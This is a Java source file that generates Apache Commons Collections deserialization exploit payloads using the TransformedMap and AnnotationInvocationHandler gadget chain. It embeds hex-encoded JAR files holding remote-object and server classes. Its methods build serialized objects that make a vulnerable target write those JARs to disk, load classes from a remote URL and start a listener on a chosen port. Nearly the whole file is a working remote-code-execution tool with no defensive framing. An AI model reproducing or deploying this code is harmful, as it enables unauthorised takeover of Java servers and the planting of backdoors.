package org.heysec.exp;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.heysec.exp.Utils;

public class Payload {
    private static final String REMOTE_JAR = "504b0304140008080800bd719c47000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5e2e50200504b0708b27f02ee1b00000019000000504b0304140008080800a6719c47000000000000000000000000250000006f72672f6865797365632f6578702f52656d6f74654f626a656374496d706c2e636c6173738d56595b5357145d870c37865bc4008180ca50d48429ce62b06a13c12a0950c4d8001d2ee10097862426378a9de7e91ff417f0e283be402ddf571ffb7dfd2dfd0d6dd7b9374c9ad63e70cf3efb9cbdf7da6befb3c31f7ffdfa1b8033f849439d4067a1b41c5d918fca321b95ebc5e8b45c2b587272615566ad5b6bc59c06b740e3aaf1c088e68cfc72d439d1e015e8f80f5301ef15336f5a57055ce1485ac09d282c4a3f5ca8d7a1c127703869e6e544656d4196668c859c1408240b592397364aa6da57956e6bc52c0b74275f817384112bc55cc15814680b27f700dfb14a667e79642e3e1b99d5d0c453fbcc2c44c7cc9c9cac58c58ac53bd258f3238016852e2810ace16236925657da7484d02ee07958322d22f484e7e2cec9511dc7546a9e6cae50961a3a059af6bc8cae6765d1320b7901bf8374cab05654da2f4562da8b866508d4cdc59997512cca3cf312b364b35021b9edc97f4b82b682a05a9235022bbf725d66054ed6482ff2b2ca8f4144350c091cd93b9baee42d734dea388d334c65595a550da386f73ba9aa6d2fe774f4e1bcc0a957049e2a15b2b25c1ed1709145d849325e595a9225b9382d8d4559d2302c10da39bb95dfcddd39f623862b1a460e80aefad5f106d8920d04bdcf4ea07507f84187847e09d7554bbcb9d7552f5c51a5bf8084ba7483f5debbe4a0e1b986b19d5cf6a5ede4e4c728ead5e7968e5edc1618f85f95718c477c48b2dc7e056042c724a6047c04b5a89e964073b866494731ade38e7dd72a385a1fee0ac08f7bc86878e7c07b772ee898c51c3b51deaf18b9b22a74f2c591301299f5e15d36bf2c950a25366a768d2deb2e9278d252a3c4ecee05de6b4bd6aeb23a2f2fec9ebf9c3c9de7ec3cbd2559aee4d4c8a9e4174cf5505a6a91c83aac7268a983f568de58a39285342dd3c8250a794bae5b7e98a8f781fda0ef1f2ff528e0be8622193d605cb5d2b18c150d6445dfff28fd28a1a2ba62458d86874a5a674b860fbc5cbb7beee1231d1fe31316847d197f6449fa728723eaedbb8bf68c70652d1a0793b5e22b22964c352b1b0efaa65ed1e18740bdcae15b1d5fe1bbda6fb04639d336b38a06bef23b854a292bc7ec302d2fcede21658c6ec671f1cfc35f170f574e797e0f7117e52a94b66f0bfea714eaa0f3ebb595f5788d5fddb980061ce6ca0ec411c7580cc24d474042c4dcdb0864fa8f6da139e60eb90736d11a726fa263035a4c733d763f8e79f6ef5d8f63defdfb90f739433673781fc571226d460fd75e443050dd9f65981e6ad47a1e9771857a07ea18e180405d84d74070cd08d24f2bcfdbd0c5b31e96b897ba087543d49d4613bd34d34b907e5a7195baeb68b7539db739495453555297cd9d927af03a232aa9172718cd45ab9338450a7a494298fe3d362625712eef4a577725c139db5fa5ae95b7357acbfc8281fe4d9c4d6de342661b9732a4eef216ae6d213eb18dd1cc166ec6dc1b680cb9439e4dbc1518e7e7dee026529998e7f7bfff5424be1df3066642de4da47f863730ff24e47d92e262839dc45d829ac68cbd3a84c5981ed049d05da4ab9b1474a1c326f704d33949624e107498c32842fb3e5a0fd07a086936cb1e49995d923278cf26c98714dec7078cd2c118061648512fff99c96291249da2ade43d0f4648b6238d32fe12252f7dbb6c92eae8874fb64a520fb58aa4f96d9864e2c3d44020f70cf93a6cc09d122941864a99fe2d5813aafb06b7f080376636f188edb781ce98eac30e257837d01ef3383b0f5bcff37c577ecae8208e26bb61cee122d761b6d7357b3f8c1b768bdd666e8ac734b3dde1f1361b0b1cef3eda34f2c7a899ed1464e66db4eee68f591f593c473fc3885393a0a7ebf414a75d82bc72d4534e539ec34d9bd7f3f6f39cdfe5751e9f5679f5e1337ccea841daab96ab638c1bf8025f929f431c1c3b8f79957b55f5e3db10e4ebebf12a6fc9fe40aeef19be7129e2c69fda0ded3c352793a01d799c7e92cc24c5b309feb73465a30af28e8fcfe87b1b5523e3282c6a68fc604f8b1fff01504b07088ba0c766b6050000b50a0000504b0304140008080800246c9a47000000000000000000000000210000006f72672f6865797365632f6578702f52656d6f74654f626a6563742e636c6173733bf56fd73e06060643067e7606264606e9fca274fd8cd4cae2d464fdd48a02fda0d4dcfc9254ffa4acd4e412760616460681acc4b244fd9cc4bc747d98281b23033f58b4283713aa819181adb420273f3185914142c307a125b8a428332fdd3ada294a338a918125b522359991410d8b0a4d4c21909979499979403345b1e9086364e00ace2f2d4a4e75cbcc01ba4010d9ed7a20f5408732323003312bd0c7cc40cfb0337030803cc5c9c005a6b9197880328c0cbc409289810f00504b07084a3ad188bb0000001c010000504b01021400140008080800bd719c47b27f02ee1b000000190000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01021400140008080800a6719c478ba0c766b6050000b50a00002500000000000000000000000000610000006f72672f6865797365632f6578702f52656d6f74654f626a656374496d706c2e636c617373504b01021400140008080800246c9a474a3ad188bb0000001c01000021000000000000000000000000006a0600006f72672f6865797365632f6578702f52656d6f74654f626a6563742e636c617373504b05060000000003000300e8000000740700000000";
    private static final String SERVER_JAR = "504b0304140008080800d6a59b47000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5e2e50200504b0708b27f02ee1b00000019000000504b0304140008080800cda59b470000000000000000000000001b0000006f72672f6865797365632f6578702f5365727665722e636c61737375566b6c14d715feeeecae67bc8cd7ebb5c730069c1012583f827984858e4901f3484d16ec60e3c4765a58af077bc97a6799dd05dca625499396266d9ab4ee03da24a4af4d9ba64d826aac425da9fd511555eaafa2568a2aa50f897fa86aa448916afadd592fd8b0f1ca77eebde7de73cff9ce77cebd57e67e3d0b60032ea850040cc71deb18b7277376b2c33e95ede8b3dd13b6abc22f103e963891e8482732631d3d23c7ec645ea06a5b2a93ca7f52c0176d1910f0ef7246ed207ca8d6114095406d3c95b10f1426466cb73f3192b60522712799480f24dc941ccf4ffaf3e3a99cc0d278c5c33b0502b97cc2e5798dd1eef82d2bfaf26e2a33d6d93210441dea554404ea6e490f1632f9d484ada301864070cccecfcfd0c9684bfc8e859d2a9652e4cd67ecfcfce17d4ef2093b1f44234ce953138d8d76b70cf8205e8286950290b2bb74dc8d55c423914cda591a5a5f3ec1d3e4e9e80c6235ee53712f61b94da4630dd60a84686377265bc8d3313b314140ca5a524ec70281a7a945472bdaa88b9b7a0af905bb962dd8b550c26df7a343c53a9a5741ab8ef5d840f7d81f25e2d1e1ae966e159b16c5bd8478101bb159a2111350b9ae9b8068d84a1658962585968e4e6c9361cba65344636db442d486ef9cd320a93432694b253b74ec441731b58f1712e99c8c5afc760676b60c69d84d2b7205029fcbc97d7b753c844f096804a66b326fe764c85a86bb82d887b88a87051a2aa1a3633f0ed0e4936e2a6fcffb3f20f7f4ea7844723970345dc88dabe823c265057b53697ba192200ee2904466e036731750f520e2b2e995cd908e614f7732ede46c0d9fa6fbc98951c9e7c33a8e2041dbed5376f263205c30d5eb3a1200c638294936ba2815e68541081cd5318671e6c308a1d96fbb63b64ba8e82cdd1deed2708cc6d8aeebb81ad2c4be904d3b09da9341568553e642219f4a77ec74ddc4644e06e9788906d430249dca4900bc64bdd3e4a1968100bc3fdfb5204ee1b32a261731ac7f5cf24fc7e7f0a4e44fdab6b3327efb2472ab3124936d48c553650a7b7bf69c92499772322a9e59c8ed9e9b02aac83ab280886ed94de4c76525bac33a3a9cf3b25ed6a28a85402e49a6537686baeaeec8705a9c9209c5e057cc5b46d791d2c6caf94918dd42a6df2b51f5150a14cf76b2499658ea49dbd2a9d1449e1451869926c152a87a3ddf6a52b943deb0af5437c51083ecd08bddde866a276bbb891230aa6b27edd4097964858c14d09d45c5a529fe71dcef94c892688b6d2ff39256a6789a2657948c08e49d7c821c5b529e8a7b2ee5ed09465ca4f86fdfc471719849f29fe24d153f5b5c9b2673dcabe3e7788b1e26243b934e96ec6aad5037ba2b4c75cb2bac4ae6c5e10de5cec672877530d8e714dca42dfda6d52556ac936ab08a89e52bb19a3dde7c6c558e3af8e50d8140eb4568efb0a3f0b680270696f007e8a505fcd6f05b8d106a4b9b031b39bb8c5bf68afde280b0fcc20acc206c555d42e360d3452cdbef8ba9be9816597e59b3aa232baca02fb6a47d1acd07ee9fc63d969f6dd40a84ab2f6b8355e1aafe4155369a6cc255618dadeab51a5b4b37fd66f534da639aa129af8933867a4e842e61e3a059ed33b48b78c0aa316b225ba6f1092b1479d00cf9364e63fb596c3203915dd3d8338d6e33308d9e4b3838d87611fd56ad591b59e1091e356ba7f1986c068be278e4f19b7ba7cc2a33e467ff3372f53446ac709d1f74a5cec726e28bd517d16ed4b3dfe08b194584cd06c330eb0c6353ffb386300ca3fef51bd7cd88d93003db8a9861b38ef60fc6ea95f337fe644666cf714320922a195744d00c9891b299c51bf53cf3a6b434377723f244d9b8b9ff4ad3aca03fb6c41f538b73ff3254fff9b9bf1b1aada9f1c542d29a1a2364561b215a131246c8d0a435ba59338389b3d019099fdcf8a6b042c692b35821913183be8b70ad9019326b080cd714d15812f8170acc90046bce69406106278b73472df5766311b034c6f7f30cf7178a586b2d2d32e28db76602d652b3f1b78bc6ef90535745afe8c369d42a24224e2b8a52a734e069a551695656e169ce372a6bc8b8a8b25ed9c4f9adca0e6517e73dd68a67781f812c55c8513f59aa220c7951d5a29e3c6dc07218686679be174b11e54c1b4cbe289a10a3641b56f05e6a461a77c1e553e92453e639dc831759d3cf71c78f701f537a0ddec25afc82df0bd4f01bb4e0777ce3fc819aaea01d57b10eef33a5ae51eb75be573fe05dff2136e1233cc014da2caaf81c09f3dbc497c86abe5b36c0125bd02976f225b21b0f8a87b15df4628738849de2301f16a37c38e4b0474c62af78120f89d3e81667b04fbcc827c214e2e2557edfe093e05df4885fa157cce011c1708959be007e8f7ef1471c1257f8fd332ffbab7854fc0d8f89f73028fe8121f14f7eaf61585ce78dfe018e880f7993ff0f2b89faa8a2e0a8c24b58a9c3b8d288b4d28409a51919227f4c8972dccef17a8e3723ab6ce5781bc73b38de83e3b262d0bf15b22ae08b7856561cf69ec3975833146537be8c338c8f5fe9c257f03c8b91aa6cc70bf82ae315a49eaf11ef00a3bc055fc74bac42cbc5bff132b5a868a6d5df604fe3ebf43d7c1353ac4451f1577c8b9a837c65fe05dfc677787a52bc82ef52aaf3cc8f7096d21aeafc0f63f83db2e20223ff7dbc4246bc0f07afe235f6ae611ce7694198314be075eead63e41ec70fd88b307e83f821cfad67045793055368103e6af931e70c46aa163f4111b58cc9519e31851af1f2bc34c438c4bcd34244b4c15ba7d2563e6ee68bef187d95457965eb6cdbec91cbdafe565fbbaf7576066fb4f9dae51c7bed6fdf2cca118204e4094181269e20694f7a05faee9212d272caabf02bf14bf6789391ee6fb3a7b05f2aedeffe1f504b0708e5e0f6f8240800004b0d0000504b01021400140008080800d6a59b47b27f02ee1b000000190000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01021400140008080800cda59b47e5e0f6f8240800004b0d00001b00000000000000000000000000610000006f72672f6865797365632f6578702f5365727665722e636c617373504b050600000000020002008f000000ce0800000000";

    public Payload() {
    }

    private static byte[] generateObject(Transformer[] transformers) throws Exception {
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);
        HashMap innerMap = new HashMap();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, (Transformer)null, transformedChain);
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(new Class[]{Class.class, Map.class});
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(new Object[]{Retention.class, outerMap});
        ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteOut);
        out.writeObject(instance);
        out.flush();
        out.close();
        return byteOut.toByteArray();
    }

    public static byte[] generateBindPayload(String remoteClassPath) throws Exception {
        Transformer[] transforms = new Transformer[]{new ConstantTransformer(URLClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(remoteClassPath)}}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{"org.heysec.exp.RemoteObjectImpl"}), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"bind", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]})};
        return generateObject(transforms);
    }

    public static byte[] generateRemotePayload(String remotePath) throws Exception {
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{remotePath}}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{Utils.hexStringToBytes("504b0304140008080800bd719c47000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5e2e50200504b0708b27f02ee1b00000019000000504b0304140008080800a6719c47000000000000000000000000250000006f72672f6865797365632f6578702f52656d6f74654f626a656374496d706c2e636c6173738d56595b5357145d870c37865bc4008180ca50d48429ce62b06a13c12a0950c4d8001d2ee10097862426378a9de7e91ff417f0e283be402ddf571ffb7dfd2dfd0d6dd7b9374c9ad63e70cf3efb9cbdf7da6befb3c31f7ffdfa1b8033f849439d4067a1b41c5d918fca321b95ebc5e8b45c2b587272615566ad5b6bc59c06b740e3aaf1c088e68cfc72d439d1e015e8f80f5301ef15336f5a57055ce1485ac09d282c4a3f5ca8d7a1c127703869e6e544656d4196668c859c1408240b592397364aa6da57956e6bc52c0b74275f817384112bc55cc15814680b27f700dfb14a667e79642e3e1b99d5d0c453fbcc2c44c7cc9c9cac58c58ac53bd258f3238016852e2810ace16236925657da7484d02ee07958322d22f484e7e2cec9511dc7546a9e6cae50961a3a059af6bc8cae6765d1320b7901bf8374cab05654da2f4562da8b866508d4cdc59997512cca3cf312b364b35021b9edc97f4b82b682a05a9235022bbf725d66054ed6482ff2b2ca8f4144350c091cd93b9baee42d734dea388d334c65595a550da386f73ba9aa6d2fe774f4e1bcc0a957049e2a15b2b25c1ed1709145d849325e595a9225b9382d8d4559d2302c10da39bb95dfcddd39f623862b1a460e80aefad5f106d8920d04bdcf4ea07507f84187847e09d7554bbcb9d7552f5c51a5bf8084ba7483f5debbe4a0e1b986b19d5cf6a5ede4e4c728ead5e7968e5edc1618f85f95718c477c48b2dc7e056042c724a6047c04b5a89e964073b866494731ade38e7dd72a385a1fee0ac08f7bc86878e7c07b772ee898c51c3b51deaf18b9b22a74f2c591301299f5e15d36bf2c950a25366a768d2deb2e9278d252a3c4ecee05de6b4bd6aeb23a2f2fec9ebf9c3c9de7ec3cbd2559aee4d4c8a9e4174cf5505a6a91c83aac7268a983f568de58a39285342dd3c8250a794bae5b7e98a8f781fda0ef1f2ff528e0be8622193d605cb5d2b18c150d6445dfff28fd28a1a2ba62458d86874a5a674b860fbc5cbb7beee1231d1fe31316847d197f6449fa728723eaedbb8bf68c70652d1a0793b5e22b22964c352b1b0efaa65ed1e18740bdcae15b1d5fe1bbda6fb04639d336b38a06bef23b854a292bc7ec302d2fcede21658c6ec671f1cfc35f170f574e797e0f7117e52a94b66f0bfea714eaa0f3ebb595f5788d5fddb980061ce6ca0ec411c7580cc24d474042c4dcdb0864fa8f6da139e60eb90736d11a726fa263035a4c733d763f8e79f6ef5d8f63defdfb90f739433673781fc571226d460fd75e443050dd9f65981e6ad47a1e9771857a07ea18e180405d84d74070cd08d24f2bcfdbd0c5b31e96b897ba087543d49d4613bd34d34b907e5a7195baeb68b7539db739495453555297cd9d927af03a232aa9172718cd45ab9338450a7a494298fe3d362625712eef4a577725c139db5fa5ae95b7357acbfc8281fe4d9c4d6de342661b9732a4eef216ae6d213eb18dd1cc166ec6dc1b680cb9439e4dbc1518e7e7dee026529998e7f7bfff5424be1df3066642de4da47f863730ff24e47d92e262839dc45d829ac68cbd3a84c5981ed049d05da4ab9b1474a1c326f704d33949624e107498c32842fb3e5a0fd07a086936cb1e49995d923278cf26c98714dec7078cd2c118061648512fff99c96291249da2ade43d0f4648b6238d32fe12252f7dbb6c92eae8874fb64a520fb58aa4f96d9864e2c3d44020f70cf93a6cc09d122941864a99fe2d5813aafb06b7f080376636f188edb781ce98eac30e257837d01ef3383b0f5bcff37c577ecae8208e26bb61cee122d761b6d7357b3f8c1b768bdd666e8ac734b3dde1f1361b0b1cef3eda34f2c7a899ed1464e66db4eee68f591f593c473fc3885393a0a7ebf414a75d82bc72d4534e539ec34d9bd7f3f6f39cdfe5751e9f5679f5e1337ccea841daab96ab638c1bf8025f929f431c1c3b8f79957b55f5e3db10e4ebebf12a6fc9fe40aeef19be7129e2c69fda0ded3c352793a01d799c7e92cc24c5b309feb73465a30af28e8fcfe87b1b5523e3282c6a68fc604f8b1fff01504b07088ba0c766b6050000b50a0000504b0304140008080800246c9a47000000000000000000000000210000006f72672f6865797365632f6578702f52656d6f74654f626a6563742e636c6173733bf56fd73e06060643067e7606264606e9fca274fd8cd4cae2d464fdd48a02fda0d4dcfc9254ffa4acd4e412760616460681acc4b244fd9cc4bc747d98281b23033f58b4283713aa819181adb420273f3185914142c307a125b8a428332fdd3ada294a338a918125b522359991410d8b0a4d4c21909979499979403345b1e9086364e00ace2f2d4a4e75cbcc01ba4010d9ed7a20f5408732323003312bd0c7cc40cfb0337030803cc5c9c005a6b9197880328c0cbc409289810f00504b07084a3ad188bb0000001c010000504b01021400140008080800bd719c47b27f02ee1b000000190000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01021400140008080800a6719c478ba0c766b6050000b50a00002500000000000000000000000000610000006f72672f6865797365632f6578702f52656d6f74654f626a656374496d706c2e636c617373504b01021400140008080800246c9a474a3ad188bb0000001c01000021000000000000000000000000006a0600006f72672f6865797365632f6578702f52656d6f74654f626a6563742e636c617373504b05060000000003000300e8000000740700000000")}), new ConstantTransformer(Integer.valueOf(1))};
        return generateObject(transformers);
    }

    public static byte[] generateServerPayload(String remotePath) throws Exception {
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{remotePath}}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{Utils.hexStringToBytes("504b0304140008080800d6a59b47000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5e2e50200504b0708b27f02ee1b00000019000000504b0304140008080800cda59b470000000000000000000000001b0000006f72672f6865797365632f6578702f5365727665722e636c61737375566b6c14d715feeeecae67bc8cd7ebb5c730069c1012583f827984858e4901f3484d16ec60e3c4765a58af077bc97a6799dd05dca625499396266d9ab4ee03da24a4af4d9ba64d826aac425da9fd511555eaafa2568a2aa50f897fa86aa448916afadd592fd8b0f1ca77eebde7de73cff9ce77cebd57e67e3d0b60032ea850040cc71deb18b7277376b2c33e95ede8b3dd13b6abc22f103e963891e8482732631d3d23c7ec645ea06a5b2a93ca7f52c0176d1910f0ef7246ed207ca8d6114095406d3c95b10f1426466cb73f3192b60522712799480f24dc941ccf4ffaf3e3a99cc0d278c5c33b0502b97cc2e5798dd1eef82d2bfaf26e2a33d6d93210441dea554404ea6e490f1632f9d484ada301864070cccecfcfd0c9684bfc8e859d2a9652e4cd67ecfcfce17d4ef2093b1f44234ce953138d8d76b70cf8205e8286950290b2bb74dc8d55c423914cda591a5a5f3ec1d3e4e9e80c6235ee53712f61b94da4630dd60a84686377265bc8d3313b314140ca5a524ec70281a7a945472bdaa88b9b7a0af905bb962dd8b550c26df7a343c53a9a5741ab8ef5d840f7d81f25e2d1e1ae966e159b16c5bd8478101bb159a2111350b9ae9b8068d84a1658962585968e4e6c9361cba65344636db442d486ef9cd320a93432694b253b74ec441731b58f1712e99c8c5afc760676b60c69d84d2b7205029fcbc97d7b753c844f096804a66b326fe764c85a86bb82d887b88a87051a2aa1a3633f0ed0e4936e2a6fcffb3f20f7f4ea7844723970345dc88dabe823c265057b53697ba192200ee2904466e036731750f520e2b2e995cd908e614f7732ede46c0d9fa6fbc98951c9e7c33a8e2041dbed5376f263205c30d5eb3a1200c638294936ba2815e68541081cd5318671e6c308a1d96fbb63b64ba8e82cdd1deed2708cc6d8aeebb81ad2c4be904d3b09da9341568553e642219f4a77ec74ddc4644e06e9788906d430249dca4900bc64bdd3e4a1968100bc3fdfb5204ee1b32a261731ac7f5cf24fc7e7f0a4e44fdab6b3327efb2472ab3124936d48c553650a7b7bf69c92499772322a9e59c8ed9e9b02aac83ab280886ed94de4c76525bac33a3a9cf3b25ed6a28a85402e49a6537686baeaeec8705a9c9209c5e057cc5b46d791d2c6caf94918dd42a6df2b51f5150a14cf76b2499658ea49dbd2a9d1449e1451869926c152a87a3ddf6a52b943deb0af5437c51083ecd08bddde866a276bbb891230aa6b27edd4097964858c14d09d45c5a529fe71dcef94c892688b6d2ff39256a6789a2657948c08e49d7c821c5b529e8a7b2ee5ed09465ca4f86fdfc471719849f29fe24d153f5b5c9b2673dcabe3e7788b1e26243b934e96ec6aad5037ba2b4c75cb2bac4ae6c5e10de5cec672877530d8e714dca42dfda6d52556ac936ab08a89e52bb19a3dde7c6c558e3af8e50d8140eb4568efb0a3f0b680270696f007e8a505fcd6f05b8d106a4b9b031b39bb8c5bf68afde280b0fcc20acc206c555d42e360d3452cdbef8ba9be9816597e59b3aa232baca02fb6a47d1acd07ee9fc63d969f6dd40a84ab2f6b8355e1aafe4155369a6cc255618dadeab51a5b4b37fd66f534da639aa129af8933867a4e842e61e3a059ed33b48b78c0aa316b225ba6f1092b1479d00cf9364e63fb596c3203915dd3d8338d6e33308d9e4b3838d87611fd56ad591b59e1091e356ba7f1986c068be278e4f19b7ba7cc2a33e467ff3372f53446ac709d1f74a5cec726e28bd517d16ed4b3dfe08b194584cd06c330eb0c6353ffb386300ca3fef51bd7cd88d93003db8a9861b38ef60fc6ea95f337fe644666cf714320922a195744d00c9891b299c51bf53cf3a6b434377723f244d9b8b9ff4ad3aca03fb6c41f538b73ff3254fff9b9bf1b1aada9f1c542d29a1a2364561b215a131246c8d0a435ba59338389b3d019099fdcf8a6b042c692b35821913183be8b70ad9019326b080cd714d15812f8170acc90046bce69406106278b73472df5766311b034c6f7f30cf7178a586b2d2d32e28db76602d652b3f1b78bc6ef90535745afe8c369d42a24224e2b8a52a734e069a551695656e169ce372a6bc8b8a8b25ed9c4f9adca0e6517e73dd68a67781f812c55c8513f59aa220c7951d5a29e3c6dc07218686679be174b11e54c1b4cbe289a10a3641b56f05e6a461a77c1e553e92453e639dc831759d3cf71c78f701f537a0ddec25afc82df0bd4f01bb4e0777ce3fc819aaea01d57b10eef33a5ae51eb75be573fe05dff2136e1233cc014da2caaf81c09f3dbc497c86abe5b36c0125bd02976f225b21b0f8a87b15df4628738849de2301f16a37c38e4b0474c62af78120f89d3e81667b04fbcc827c214e2e2557edfe093e05df4885fa157cce011c1708959be007e8f7ef1471c1257f8fd332ffbab7854fc0d8f89f73028fe8121f14f7eaf61585ce78dfe018e880f7993ff0f2b89faa8a2e0a8c24b58a9c3b8d288b4d28409a51919227f4c8972dccef17a8e3723ab6ce5781bc73b38de83e3b262d0bf15b22ae08b7856561cf69ec3975833146537be8c338c8f5fe9c257f03c8b91aa6cc70bf82ae315a49eaf11ef00a3bc055fc74bac42cbc5bff132b5a868a6d5df604fe3ebf43d7c1353ac4451f1577c8b9a837c65fe05dfc677787a52bc82ef52aaf3cc8f7096d21aeafc0f63f83db2e20223ff7dbc4246bc0f07afe235f6ae611ce7694198314be075eead63e41ec70fd88b307e83f821cfad67045793055368103e6af931e70c46aa163f4111b58cc9519e31851af1f2bc34c438c4bcd34244b4c15ba7d2563e6ee68bef187d95457965eb6cdbec91cbdafe565fbbaf7576066fb4f9dae51c7bed6fdf2cca118204e4094181269e20694f7a05faee9212d272caabf02bf14bf6789391ee6fb3a7b05f2aedeffe1f504b0708e5e0f6f8240800004b0d0000504b01021400140008080800d6a59b47b27f02ee1b000000190000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01021400140008080800cda59b47e5e0f6f8240800004b0d00001b00000000000000000000000000610000006f72672f6865797365632f6578702f5365727665722e636c617373504b050600000000020002008f000000ce0800000000")}), new ConstantTransformer(Integer.valueOf(1))};
        return generateObject(transformers);
    }

    public static byte[] generateStartPayload(String remoteClassPath, String remotePath, int port) throws Exception {
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(URLClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(remoteClassPath)}}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{"org.heysec.exp.Server"}), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"start", new Class[]{Integer.TYPE, String.class}}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{Integer.valueOf(port), remotePath}})};
        return generateObject(transformers);
    }
}
